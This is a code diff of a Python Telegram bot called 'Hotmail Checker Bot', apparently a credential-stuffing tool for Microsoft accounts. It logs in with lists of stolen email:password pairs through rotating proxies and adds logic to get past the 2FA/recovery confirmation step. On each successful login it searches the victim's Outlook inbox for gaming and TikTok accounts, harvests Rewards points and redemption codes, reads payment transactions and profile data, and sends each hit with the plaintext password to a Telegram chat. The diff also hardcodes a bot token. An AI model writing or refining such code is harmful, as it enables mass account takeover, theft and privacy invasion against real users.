@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Hotmail Checker Bot - High Performance Version"""
+"""Hotmail Checker Bot - Flux Optimized Version"""
 
 import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading
 from datetime import datetime
@@ -17,8 +17,11 @@ logger = logging.getLogger(__name__)
 
 # Config
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "5944410248"))
+ADMIN_ID = 5944410248
 DB = "checker.db"
+
+# Flux flow global
+sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
 
 # Global proxy list and thread pool
 PROXIES = []
@@ -175,40 +178,85 @@ class Checker:
         if proxy:
             self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
 
-        self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
         self.headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
             'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
         }
 
     def get_login_params(self):
-        try:
-            r = self.session.get(self.sFTTag_url, headers=self.headers, timeout=10)
-            text = r.text
-            ppft = re.search(r'name="PPFT".*?value="(.+?)"', text) or re.search(r'sFTTag:\'(.+?)\'', text) or re.search(r'value="(.+?)"', text)
-            url_post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r'action="(.+?)"', text)
-            if ppft and url_post:
-                return url_post.group(1).replace('&amp;', '&'), ppft.group(1)
-        except: pass
+        """Exact logic from flux.py for obtaining PPFT and urlPost"""
+        attempts = 0
+        while attempts < 3:
+            try:
+                r = self.session.get(sFTTag_url, headers=self.headers, timeout=10)
+                text = r.text
+                sFTTag = None
+                match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
+                        re.search('value="(.+?)"', text, re.S) or \
+                        re.search("sFTTag:'(.+?)'", text, re.S) or \
+                        re.search('sFTTag:"(.+?)"', text, re.S) or \
+                        re.search('name="PPFT".*?value="(.+?)"', text, re.S)
+                if match:
+                    sFTTag = match.group(1)
+                    urlPost = None
+                    match_url = re.search('"urlPost":"(.+?)"', text, re.S) or \
+                                re.search("urlPost:'(.+?)'", text, re.S) or \
+                                re.search('urlPost:"(.+?)"', text, re.S) or \
+                                re.search('<form.*?action="(.+?)"', text, re.S)
+                    if match_url:
+                        urlPost = match_url.group(1).replace('&amp;', '&')
+                        return urlPost, sFTTag
+            except: pass
+            attempts += 1
+            time.sleep(0.1)
         return None, None
 
     def login(self, email, password):
-        url_post, ppft = self.get_login_params()
-        if not url_post or not ppft: return None
+        """Exact logic from flux.py including intermediate flows"""
+        urlPost, sFTTag = self.get_login_params()
+        if not urlPost or not sFTTag: return None
 
-        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
-        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': self.headers['User-Agent'], 'Referer': self.sFTTag_url}
+        attempts = 0
+        while attempts < 3:
+            try:
+                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
+                r = self.session.post(urlPost, data=data, headers=self.headers, allow_redirects=True, timeout=15)
 
-        try:
-            r = self.session.post(url_post, data=data, headers=headers, allow_redirects=True, timeout=15)
-            if '#' in r.url:
-                fragment = urlparse(r.url).fragment
-                params = parse_qs(fragment)
-                return params.get('access_token', [None])[0]
+                # Success
+                if '#' in r.url and r.url != sFTTag_url:
+                    token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
+                    if token: return token
 
-            if any(x in r.text for x in ['identity/confirm', 'Email/Confirm', 'recover?mkt', 'Abuse?mkt']): return '2FA'
-            if any(x in r.text.lower() for x in ['password is incorrect', "account doesn't exist"]): return 'BAD'
-        except: pass
+                # Intermediate 2FA/Confirm
+                elif 'cancel?mkt=' in r.text:
+                    try:
+                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', r.text)
+                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', r.text)
+                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', r.text)
+                        if ipt and pprid and uaid:
+                            d = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
+                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r.text)
+                            if action:
+                                ret = self.session.post(action.group(), data=d, timeout=10)
+                                r_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
+                                if r_url:
+                                    fin = self.session.get(r_url.group(), timeout=10)
+                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
+                                    if token: return token
+                    except: pass
+                    return '2FA'
+
+                elif any(v in r.text for v in ['recover?mkt', 'account.live.com/identity/confirm', 'Email/Confirm', '/Abuse?mkt']):
+                    return '2FA'
+
+                elif any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'sign in to your microsoft account']):
+                    return 'BAD'
+            except: pass
+            attempts += 1
+            time.sleep(0.1)
         return None
 
     def check_rewards(self, token):
@@ -221,9 +269,9 @@ class Checker:
             if data['points'] > 0:
                 url = 'https://rewards.bing.com/redeem/orderhistory'
                 r = self.session.get(url, timeout=10)
-                if 'fmHF' in r.text:
+                if 'fmHF' in r.text or 'JavaScript required to sign in' in r.text:
                     soup = BeautifulSoup(r.text, 'html.parser')
-                    form = soup.find('form', id='fmHF')
+                    form = soup.find('form', id='fmHF') or soup.find('form', attrs={'name': 'fmHF'})
                     if form:
                         d = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
                         a = form.get('action', '')
@@ -242,53 +290,51 @@ class Checker:
         except: pass
         return data
 
-    def search_inbox(self, token, email, keywords):
-        found = []
+    def capture_full(self, token, email):
+        cap = {'minecraft': 'No', 'psn': 'No', 'steam': 'No', 'supercell': 'No', 'tiktok': 'No', 'subs': [], 'name': 'N/A', 'country': 'N/A'}
         try:
             cid = self.session.cookies.get("MSPCID", "").upper()
-            headers = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
-            for kw in keywords:
-                payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": kw}, "Size": 1}]}
-                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=headers, timeout=10)
-                if r.status_code == 200:
-                    try:
-                        total = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
-                        if total > 0: found.append(f"{kw}({total})")
-                    except: pass
-        except: pass
-        return found
+            h = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0'}
 
-    def capture_full(self, token, email):
-        cap = {'minecraft': 'No', 'psn': 'No', 'steam': 'No', 'supercell': 'No', 'tiktok': 'No', 'subs': []}
-        try:
+            # Profile
             try:
-                r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=10)
-                if r.status_code == 200: cap['minecraft'] = f"Yes ({r.json().get('name')})"
+                r_prof = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=10)
+                if r_prof.status_code == 200:
+                    p = r_prof.json()
+                    cap['name'] = p.get('displayName', 'N/A')
+                    loc = p.get('location', {})
+                    cap['country'] = loc.get('country', 'N/A') if isinstance(loc, dict) else loc
+            except: pass
+
+            # Minecraft
+            try:
+                r_mc = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=10)
+                if r_mc.status_code == 200: cap['minecraft'] = f"Yes ({r_mc.json().get('name')})"
             except: pass
             
-            cid = self.session.cookies.get("MSPCID", "").upper()
-            headers = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0'}
+            # Inbox Checks
             queries = {'psn': "sony@txn-email.playstation.com OR PlayStation Order", 'steam': "noreply@steampowered.com purchase", 'supercell': "noreply@id.supercell.com", 'tiktok': "account.tiktok"}
             for key, q in queries.items():
                 payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": q}, "Size": 1}]}
-                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers={**headers, 'Content-Type': 'application/json'}, timeout=10)
+                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers={**h, 'Content-Type': 'application/json'}, timeout=10)
                 if r.status_code == 200:
                     try:
                         t = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
                         if t > 0: cap[key] = f"Yes ({t})"
                     except: pass
 
+            # Subscriptions
             state = json.dumps({"userId": str(uuid.uuid4()).replace('-', '')[:16], "scopeSet": "pidl"})
-            url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state) + "&prompt=none"
-            r = self.session.get(url, headers={"Referer": "https://account.microsoft.com/"}, timeout=15)
-            p_token = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
+            url_sub = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state) + "&prompt=none"
+            r_s = self.session.get(url_sub, headers={"Referer": "https://account.microsoft.com/"}, timeout=15)
+            p_token = re.search(r'access_token=([^&\s"\']+)', r_s.text + " " + r_s.url)
             if p_token:
-                p_headers = {"Authorization": 'MSADELEGATE1.0="' + unquote(p_token.group(1)) + '"', "Accept": "application/json", "Referer": "https://account.microsoft.com/"}
-                r_sub = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=p_headers, timeout=10)
-                if r_sub.status_code == 200:
+                ph = {"Authorization": 'MSADELEGATE1.0="' + unquote(p_token.group(1)) + '"', "Accept": "application/json", "Referer": "https://account.microsoft.com/"}
+                r_tx = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=ph, timeout=10)
+                if r_tx.status_code == 200:
                     kws = {'Xbox Game Pass': 'Game Pass', 'Microsoft 365': 'M365', 'Office 365': 'Office 365', 'OneDrive': 'OneDrive'}
-                    for kw, name in kws.items():
-                        if kw in r_sub.text: cap['subs'].append(name)
+                    for kw, n in kws.items():
+                        if kw in r_tx.text: cap['subs'].append(n)
         except: pass
         return cap
 
@@ -302,11 +348,22 @@ class Checker:
         if token == 'BAD': return res
 
         res['status'] = 'hit'
-        rew = self.check_rewards(token)
-        res['points'] = rew['points']
-        res['codes'] = list(set(rew['codes']))
+        res['rew'] = self.check_rewards(token)
+        res['points'] = res['rew']['points']
+        res['codes'] = list(set(res['rew']['codes']))
         res['cap'] = self.capture_full(token, email)
-        if keywords: res['keywords'] = self.search_inbox(token, email, keywords)
+        if keywords:
+            res['keywords'] = []
+            cid = self.session.cookies.get("MSPCID", "").upper()
+            h = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
+            for kw in keywords:
+                p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": kw}, "Size": 1}]}
+                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=10)
+                if r.status_code == 200:
+                    try:
+                        total = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
+                        if total > 0: res['keywords'].append(f"{kw}({total})")
+                    except: pass
         return res
 
 db = Database()
@@ -330,9 +387,8 @@ async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
         f = await c.bot.get_file(u.message.document.file_id)
         content = (await f.download_as_bytearray()).decode('utf-8')
         global PROXIES
-        # Supports ip:port format
         PROXIES = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
-        await u.message.reply_text(f"✅ Loaded `{len(PROXIES)}` proxies (HTTP/HTTPS supported).")
+        await u.message.reply_text(f"✅ Loaded `{len(PROXIES)}` proxies.")
 
 async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
@@ -350,8 +406,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
     start_time = time.time()
     results_file = f"hits_{uid}.txt"
     update_lock = asyncio.Lock()
-    last_hits = []
-    last_update = 0
+    last_hits, last_update = [], 0
 
     async def worker(line):
         nonlocal hits, bad, tfa, checked, last_update
@@ -367,18 +422,18 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
             if res['status'] == 'hit':
                 hits += 1
                 cap = res['cap']
-                cap_str = ", ".join([f"{k}:{v}" for k,v in cap.items() if v != 'No' and k != 'subs'])
+                cap_str = f"Name:{cap['name']} | Country:{cap['country']} | "
+                cap_str += ", ".join([f"{k}:{v}" for k,v in cap.items() if v != 'No' and k not in ['subs', 'name', 'country']])
                 if cap.get('subs'): cap_str += f" | Subs:{', '.join(cap['subs'])}"
 
-                ht = f"🎯 **HIT**\n📧 `{e}`\n🔑 `{p}`\n💰 Pts: `{res['points']}`\n🎁 Codes: `{len(res['codes'])}`"
+                ht = f"🎯 **HIT**\n📧 `{e}`\n🔑 `{p}`\n💰 Pts: `{res['points']}` | 🎁 Codes: `{len(res['codes'])}`"
                 if cap_str: ht += f"\n🎮 Cap: `{cap_str}`"
                 if res['keywords']: ht += f"\n📂 Key: `{', '.join(res['keywords'])}`"
 
                 last_hits.append(f"✅ {e}")
                 if len(last_hits) > 5: last_hits.pop(0)
-
                 await c.bot.send_message(uid, ht, parse_mode='Markdown')
-                with open(results_file, 'a') as f: f.write(f"{e}:{p} | Pts: {res['points']} | Cap: {cap_str} | Key: {res['keywords']} | Codes: {res['codes']}\n")
+                with open(results_file, 'a') as f: f.write(f"{e}:{p} | Pts:{res['points']} | Cap:{cap_str} | Key:{res['keywords']} | Codes:{res['codes']}\n")
             elif res['status'] == '2fa': tfa += 1
             else: bad += 1
 
@@ -388,12 +443,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
                     last_update = now
                     elapsed = now - start_time
                     cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
-                    capture_screen = "\n".join(last_hits)
-                    prg = (f"🔄 **Live Capture Screen**\n\n"
-                           f"📊 Progress: `{checked}/{len(lines)}`\n"
-                           f"🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n"
-                           f"🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`\n\n"
-                           f"🕒 Last Hits:\n`{capture_screen or 'None yet'}`")
+                    prg = (f"🔄 **Live Capture Screen**\n\n📊 Progress: `{checked}/{len(lines)}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`\n\n🕒 Last Hits:\n`{chr(10).join(last_hits) or 'None yet'}`")
                     try: await status_msg.edit_text(prg, parse_mode='Markdown')
                     except: pass
         except: pass
@@ -419,10 +469,8 @@ async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     elif q.data == "check": await q.edit_message_text("📝 **Combo Input**\n\nSend `email:password` list or upload a `.txt` file.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "stats":
         s = db.user_stats(uid)
-        creds = "Unlimited" if uid == ADMIN_ID else s['credits']
-        user_label = "Admin" if uid == ADMIN_ID else u.effective_user.first_name
-        await q.edit_message_text(f"📊 **Statistics for {user_label}**\n\n💰 Credits: `{creds}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
-    elif q.data == "proxies": await q.edit_message_text(f"🌐 **Proxy Loader**\n\nLoaded: `{len(PROXIES)}` proxies.\nFormat: `ip:port` (HTTP/HTTPS only).\nUpdate by uploading .txt with 'proxy' in caption.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+        await q.edit_message_text(f"📊 **Statistics for {'Admin' if uid == ADMIN_ID else u.effective_user.first_name}**\n\n💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+    elif q.data == "proxies": await q.edit_message_text(f"🌐 **Proxy Loader**\n\nLoaded: `{len(PROXIES)}` proxies.\nUpdate by uploading .txt with 'proxy' in caption.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "admin":
         if uid == ADMIN_ID:
             s = db.get_stats()
